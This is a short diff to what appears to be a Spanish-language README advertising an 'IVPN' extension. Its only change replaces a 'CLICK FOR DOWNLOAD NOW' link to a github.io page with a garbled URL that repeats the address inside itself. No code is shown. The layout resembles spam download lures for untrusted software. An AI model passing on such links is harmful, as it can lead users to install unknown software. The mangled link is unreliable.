@@ -4,7 +4,7 @@ Profesional IVPN Extensión | enmascaramiento de IP + IP dedicada es el mejor IV
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://foundtailorthink.github.io/ivpn-cs22/ ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://foundtailorthinhttps://foundtailorthink.github.io/ivpn-cs22/k.github.io/ivpn-cs22/ ) |
  |---------------------|----------------------:|
 
 
